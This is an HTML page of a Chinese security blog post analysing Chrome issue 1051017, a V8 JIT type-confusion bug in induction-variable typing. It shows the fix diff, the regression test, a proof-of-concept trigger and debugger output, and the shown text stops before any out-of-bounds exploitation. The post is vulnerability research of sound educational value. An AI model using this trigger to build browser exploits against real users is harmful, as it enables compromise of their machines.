@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;227284 0x00 前言chrome issue 1051017是2020年2月公布的一个v8漏洞，该漏洞是在JIT优化时对循环变量的类型估算考虑不周导致的compiler阶段的类型混淆，通过compiler阶段的类型混淆进一步构造OOB溢出。 0x01 前置知识induction variable指循环中">
+<meta property="og:type" content="article">
+<meta property="og:title" content="chrome issue 1051017 v8 逃逸">
+<meta property="og:url" content="https://github.com/ha1vk/2021/01/11/issue-1051017/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;227284 0x00 前言chrome issue 1051017是2020年2月公布的一个v8漏洞，该漏洞是在JIT优化时对循环变量的类型估算考虑不周导致的compiler阶段的类型混淆，通过compiler阶段的类型混淆进一步构造OOB溢出。 0x01 前置知识induction variable指循环中">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t01ab096c1218a67a43.png">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t0154391966a37b1944.png">
+<meta property="og:image" content="https://p4.ssl.qhimg.com/t01eada738d883781db.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t010adfa6d49da0f250.png">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t01eb68dc5b1eea52b3.png">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t014313a74ce69645a6.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t010e30c9f64a344b51.png">
+<meta property="article:published_time" content="2021-01-11T06:30:10.000Z">
+<meta property="article:modified_time" content="2025-06-26T09:22:21.079Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="JS引擎漏洞">
+<meta property="article:tag" content="类型混淆">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://p5.ssl.qhimg.com/t01ab096c1218a67a43.png">
+
+<link rel="canonical" href="https://github.com/ha1vk/2021/01/11/issue-1051017/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>chrome issue 1051017 v8 逃逸 | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2021/01/11/issue-1051017/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          chrome issue 1051017 v8 逃逸
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-01-11 14:30:10" itemprop="dateCreated datePublished" datetime="2021-01-11T14:30:10+08:00">2021-01-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 17:22:21" itemprop="dateModified" datetime="2025-06-26T17:22:21+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">安全研究</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>文章首发于安全KER <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/227284">https://www.anquanke.com/post/id/227284</a></p>
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>chrome issue 1051017是2020年2月公布的一个v8漏洞，该漏洞是在JIT优化时对循环变量的类型估算考虑不周导致的compiler阶段的类型混淆，通过compiler阶段的类型混淆进一步构造OOB溢出。</p>
+<h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%BD%92%E7%BA%B3%E5%8F%98%E9%87%8F/53353317?fr=aladdin">induction variable</a>指循环中的一个变量，其值在每一次循环迭代过程中增加（或减少）固定的值，也就是循环中的i变量等。有关编译器确定程序中循环变量的算法，可以阅读论文<code>INTERPROCEDURAL INDUCTION VARIABLE ANALYSIS</code>。</p>
+<h2 id="0x02-issue-1051017-分析"><a href="#0x02-issue-1051017-分析" class="headerlink" title="0x02 issue 1051017 分析"></a>0x02 issue 1051017 分析</h2><h3 id="patch分析"><a href="#patch分析" class="headerlink" title="patch分析"></a>patch分析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span><br><span class="line">index 14ec856..4e86b96 100644</span><br><span class="line">--- a/src/compiler/typer.cc</span><br><span class="line">+++ b/src/compiler/typer.cc</span><br><span class="line">@@ -847,30 +847,24 @@</span><br><span class="line">   DCHECK_EQ(IrOpcode::kLoop, NodeProperties::GetControlInput(node)-&gt;opcode());</span><br><span class="line">   DCHECK_EQ(2, NodeProperties::GetControlInput(node)-&gt;InputCount());</span><br><span class="line"> </span><br><span class="line">-  auto res = induction_vars_-&gt;induction_variables().find(node-&gt;id());</span><br><span class="line">-  DCHECK(res != induction_vars_-&gt;induction_variables().end());</span><br><span class="line">-  InductionVariable* induction_var = res-&gt;second;</span><br><span class="line">-  InductionVariable::ArithmeticType arithmetic_type = induction_var-&gt;Type();</span><br><span class="line">   Type initial_type = Operand(node, 0);</span><br><span class="line">   Type increment_type = Operand(node, 2);</span><br><span class="line"> </span><br><span class="line">-  const bool both_types_integer = initial_type.Is(typer_-&gt;cache_-&gt;kInteger) &amp;&amp;</span><br><span class="line">-                                  increment_type.Is(typer_-&gt;cache_-&gt;kInteger);</span><br><span class="line">-  bool maybe_nan = false;</span><br><span class="line">-  // The addition or subtraction could still produce a NaN, if the integer</span><br><span class="line">-  // ranges touch infinity.</span><br><span class="line">-  if (both_types_integer) &#123;</span><br><span class="line">-    Type resultant_type =</span><br><span class="line">-        (arithmetic_type == InductionVariable::ArithmeticType::kAddition)</span><br><span class="line">-            ? typer_-&gt;operation_typer()-&gt;NumberAdd(initial_type, increment_type)</span><br><span class="line">-            : typer_-&gt;operation_typer()-&gt;NumberSubtract(initial_type,</span><br><span class="line">-                                                        increment_type);</span><br><span class="line">-    maybe_nan = resultant_type.Maybe(Type::NaN());</span><br><span class="line">+  // If we do not have enough type information for the initial value or</span><br><span class="line">+  // the increment, just return the initial value&#x27;s type.</span><br><span class="line">+  if (initial_type.IsNone() ||</span><br><span class="line">+      increment_type.Is(typer_-&gt;cache_-&gt;kSingletonZero)) &#123;</span><br><span class="line">+    return initial_type;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">-  // We only handle integer induction variables (otherwise ranges</span><br><span class="line">-  // do not apply and we cannot do anything).</span><br><span class="line">-  if (!both_types_integer || maybe_nan) &#123;</span><br><span class="line">+  // We only handle integer induction variables (otherwise ranges do not apply</span><br><span class="line">+  // and we cannot do anything). Moreover, we don&#x27;t support infinities in</span><br><span class="line">+  // &#123;increment_type&#125; because the induction variable can become NaN through</span><br><span class="line">+  // addition/subtraction of opposing infinities.</span><br><span class="line">+  if (!initial_type.Is(typer_-&gt;cache_-&gt;kInteger) ||</span><br><span class="line">+      !increment_type.Is(typer_-&gt;cache_-&gt;kInteger) ||</span><br><span class="line">+      increment_type.Min() == -V8_INFINITY ||</span><br><span class="line">+      increment_type.Max() == +V8_INFINITY) &#123;</span><br><span class="line">     // Fallback to normal phi typing, but ensure monotonicity.</span><br><span class="line">     // (Unfortunately, without baking in the previous type, monotonicity might</span><br><span class="line">     // be violated because we might not yet have retyped the incrementing</span><br><span class="line">@@ -883,14 +877,13 @@</span><br><span class="line">     &#125;</span><br><span class="line">     return type;</span><br><span class="line">   &#125;</span><br><span class="line">-  // If we do not have enough type information for the initial value or</span><br><span class="line">-  // the increment, just return the initial value&#x27;s type.</span><br><span class="line">-  if (initial_type.IsNone() ||</span><br><span class="line">-      increment_type.Is(typer_-&gt;cache_-&gt;kSingletonZero)) &#123;</span><br><span class="line">-    return initial_type;</span><br><span class="line">-  &#125;</span><br><span class="line"> </span><br><span class="line">   // Now process the bounds.</span><br><span class="line">+  auto res = induction_vars_-&gt;induction_variables().find(node-&gt;id());</span><br><span class="line">+  DCHECK(res != induction_vars_-&gt;induction_variables().end());</span><br><span class="line">+  InductionVariable* induction_var = res-&gt;second;</span><br><span class="line">+  InductionVariable::ArithmeticType arithmetic_type = induction_var-&gt;Type();</span><br><span class="line">+</span><br><span class="line">   double min = -V8_INFINITY;</span><br><span class="line">   double max = V8_INFINITY;</span><br><span class="line"> </span><br><span class="line">@@ -946,8 +939,8 @@</span><br><span class="line">     // The lower bound must be at most the initial value&#x27;s lower bound.</span><br><span class="line">     min = std::min(min, initial_type.Min());</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">-    // Shortcut: If the increment can be both positive and negative,</span><br><span class="line">-    // the variable can go arbitrarily far, so just return integer.</span><br><span class="line">+    // If the increment can be both positive and negative, the variable can go</span><br><span class="line">+    // arbitrarily far.</span><br><span class="line">     return typer_-&gt;cache_-&gt;kInteger;</span><br><span class="line">   &#125;</span><br><span class="line">   if (FLAG_trace_turbo_loop) &#123;</span><br><span class="line">diff --git a/test/mjsunit/compiler/regress-1051017.js b/test/mjsunit/compiler/regress-1051017.js</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000..16ed22e</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/test/mjsunit/compiler/regress-1051017.js</span><br><span class="line">@@ -0,0 +1,34 @@</span><br><span class="line">+// Copyright 2020 the V8 project authors. All rights reserved.</span><br><span class="line">+// Use of this source code is governed by a BSD-style license that can be</span><br><span class="line">+// found in the LICENSE file.</span><br><span class="line">+</span><br><span class="line">+// Flags: --allow-natives-syntax</span><br><span class="line">+</span><br><span class="line">+</span><br><span class="line">+function foo1() &#123;</span><br><span class="line">+  var x = -Infinity;</span><br><span class="line">+  var i = 0;</span><br><span class="line">+  for (; i &lt; 1; i += x) &#123;</span><br><span class="line">+    if (i == -Infinity) x = +Infinity;</span><br><span class="line">+  &#125;</span><br><span class="line">+  return i;</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+%PrepareFunctionForOptimization(foo1);</span><br><span class="line">+assertEquals(NaN, foo1());</span><br><span class="line">+assertEquals(NaN, foo1());</span><br><span class="line">+%OptimizeFunctionOnNextCall(foo1);</span><br><span class="line">+assertEquals(NaN, foo1());</span><br><span class="line">+</span><br><span class="line">+</span><br><span class="line">+function foo2() &#123;</span><br><span class="line">+  var i = -Infinity;</span><br><span class="line">+  for (; i &lt;= 42; i += Infinity) &#123; &#125;</span><br><span class="line">+  return i;</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line">+%PrepareFunctionForOptimization(foo2);</span><br><span class="line">+assertEquals(NaN, foo2());</span><br><span class="line">+assertEquals(NaN, foo2());</span><br><span class="line">+%OptimizeFunctionOnNextCall(foo2);</span><br><span class="line">+assertEquals(NaN, foo2());</span><br></pre></td></tr></table></figure>
+<p>该patch是用于修复<code>ISSUE 1051017</code>漏洞的,该patch的批注如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">The bug is that induction variable typing does not take into account</span><br><span class="line">that the value can become NaN through addition or subtraction of</span><br><span class="line">Infinities. The previous fix incorrectly assumed that this can only</span><br><span class="line">happen when the initial value of the loop variable is an Infinity.</span><br></pre></td></tr></table></figure>
+<p>该patch位于<code>src/compiler/typer.cc</code>源文件的<code>Typer::Visitor::TypeInductionVariablePhi</code>函数，从文件名和函数名可以推出，该函数属于JIT编译器的一部分，并且可能是在<code>Typer</code>阶段被调用，且与循环变量(induction variables)有关。</p>
+<h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>为了弄清楚漏洞原理，我们回退到<code>parent</code>版本，编译v8引擎以后进行调试，我们使用其给出的poc进行调试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">    var x = -Infinity;</span><br><span class="line">    var i = 0;</span><br><span class="line">    for (; i &lt; 1; i += x) &#123;</span><br><span class="line">        if (i == -Infinity) x = +Infinity;</span><br><span class="line">    &#125;</span><br><span class="line">    return i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%PrepareFunctionForOptimization(foo);</span><br><span class="line">print(Object.is(foo(), NaN));</span><br><span class="line">print(Object.is(foo(), NaN));</span><br><span class="line">%OptimizeFunctionOnNextCall(foo);</span><br><span class="line">print(Object.is(foo(), NaN));</span><br></pre></td></tr></table></figure>
+<p>在该poc中，i就是<code>induction variables</code>，而x就是<code>increment</code><br>首先<code>Typer::Visitor::TypeInductionVariablePhi</code>设置断点，然后运行poc，来到<code>both_types_integer</code>的判断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">   857   const bool both_types_integer = initial_type.Is(typer_-&gt;cache_-&gt;kInteger) &amp;&amp;</span><br><span class="line">   858                                   increment_type.Is(typer_-&gt;cache_-&gt;kInteger);</span><br><span class="line"> ► 859   bool maybe_nan = false;</span><br><span class="line">   860   // The addition or subtraction could still produce a NaN, if the integer</span><br><span class="line">   861   // ranges touch infinity.</span><br><span class="line">   862   if (both_types_integer) &#123;</span><br><span class="line">   863     Type resultant_type =</span><br><span class="line">   864         (arithmetic_type == InductionVariable::ArithmeticType::kAddition)</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7ffda7688b70 —▸ 0x7ffda7688ba0 —▸ 0x561e3b26eb40 —▸ 0x7f7274ace980 —▸ 0x7f72749fc8f8 ◂— ...</span><br><span class="line">01:0008│      0x7ffda7688b78 —▸ 0x7f727414f6f3 ◂— and    al, 1</span><br><span class="line">02:0010│      0x7ffda7688b80 ◂— 0x0</span><br><span class="line">03:0018│      0x7ffda7688b88 ◂— 0x100561e3b28c9d0</span><br><span class="line">04:0020│      0x7ffda7688b90 —▸ 0x561e3b26eb40 —▸ 0x7f7274ace980 —▸ 0x7f72749fc8f8 —▸ 0x7f72744a74a0 ◂— ...</span><br><span class="line">05:0028│      0x7ffda7688b98 —▸ 0x561e3b28c9d0 ◂— 0x45e00000004</span><br><span class="line">06:0030│      0x7ffda7688ba0 —▸ 0x561e3b26eb40 —▸ 0x7f7274ace980 —▸ 0x7f72749fc8f8 —▸ 0x7f72744a74a0 ◂— ...</span><br><span class="line">07:0038│      0x7ffda7688ba8 —▸ 0x7ffda7688bc8 —▸ 0x561e3b26eb40 —▸ 0x7f7274ace980 —▸ 0x7f72749fc8f8 ◂— ...</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0     7f7274829ec9 v8::internal::compiler::Typer::Visitor::TypeInductionVariablePhi(v8::internal::compiler::Node*)+825</span><br><span class="line">   f 1     7f7274822627 v8::internal::compiler::Typer::Visitor::Reduce(v8::internal::compiler::Node*)+2887</span><br><span class="line">   f 2     7f7274531c97 v8::internal::compiler::GraphReducer::Reduce(v8::internal::compiler::Node*)+231</span><br><span class="line">   f 3     7f72745318b7 v8::internal::compiler::GraphReducer::ReduceTop()+775</span><br><span class="line">   f 4     7f72745312b1 v8::internal::compiler::GraphReducer::ReduceNode(v8::internal::compiler::Node*)+209</span><br><span class="line">   f 5     7f7274531ba0 v8::internal::compiler::GraphReducer::ReduceGraph()+48</span><br><span class="line">   f 6     7f727481b510</span><br><span class="line">   f 7     7f727473faad</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p both_types_integer</span><br><span class="line">$8 = true</span><br></pre></td></tr></table></figure>
+<p>因为poc里，<code>induction variables</code>i初始值为0，属于<code>typer_-&gt;cache_-&gt;kInteger</code>类型，然后<code>increment</code>x初始值为<code>-Infinity</code>，也属于<code>typer_-&gt;cache_-&gt;kInteger</code>类型，因此，接下来会进入if分支</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   862   if (both_types_integer) &#123;</span><br><span class="line">   863     Type resultant_type =</span><br><span class="line"> ► 864         (arithmetic_type == InductionVariable::ArithmeticType::kAddition)</span><br><span class="line">   865             ? typer_-&gt;operation_typer()-&gt;NumberAdd(initial_type, increment_type)</span><br><span class="line">   866             : typer_-&gt;operation_typer()-&gt;NumberSubtract(initial_type,</span><br><span class="line">   867                                                         increment_type);</span><br><span class="line">   868     maybe_nan = resultant_type.Maybe(Type::NaN());</span><br><span class="line">   869   &#125;</span><br><span class="line">──────────────────────────────────</span><br></pre></td></tr></table></figure>
+<p>执行后，<code>maybe_nan</code>为false，这样程序顺利绕过了下面的if</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// We only handle integer induction variables (otherwise ranges</span><br><span class="line">// do not apply and we cannot do anything).</span><br><span class="line">if (!both_types_integer || maybe_nan) &#123;</span><br><span class="line">  // Fallback to normal phi typing, but ensure monotonicity.</span><br><span class="line">  // (Unfortunately, without baking in the previous type, monotonicity might</span><br><span class="line">  // be violated because we might not yet have retyped the incrementing</span><br><span class="line">  // operation even though the increment&#x27;s type might been already reflected</span><br><span class="line">  // in the induction variable phi.)</span><br><span class="line">  Type type = NodeProperties::IsTyped(node) ? NodeProperties::GetType(node)</span><br><span class="line">                                            : Type::None();</span><br><span class="line">  for (int i = 0; i &lt; arity; ++i) &#123;</span><br><span class="line">    type = Type::Union(type, Operand(node, i), zone());</span><br><span class="line">  &#125;</span><br><span class="line">  return type;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接下来就开始正式处理循环逻辑了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  897   double increment_min;</span><br><span class="line">  898   double increment_max;</span><br><span class="line">  899   if (arithmetic_type == InductionVariable::ArithmeticType::kAddition) &#123;</span><br><span class="line">  900     increment_min = increment_type.Min();</span><br><span class="line">  901     increment_max = increment_type.Max();</span><br><span class="line">► 902   &#125; else &#123;</span><br><span class="line">  903     DCHECK_EQ(InductionVariable::ArithmeticType::kSubtraction, arithmetic_type);</span><br><span class="line">  904     increment_min = -increment_type.Max();</span><br><span class="line">  905     increment_max = -increment_type.Min();</span><br><span class="line">  906   &#125;</span><br></pre></td></tr></table></figure>
+<p>由于poc里，i执行的操作是<code>+=</code>，满足条件<code>arithmetic_type == InductionVariable::ArithmeticType::kAddition</code>，因此，<code>increment_min</code>等于<code>-inf</code>，而<code>increment_max</code>等于<code>inf</code>，那么就直接进入下面的<code>else</code>分支，返回<code>typer_-&gt;cache_-&gt;kInteger;</code>类型</p>
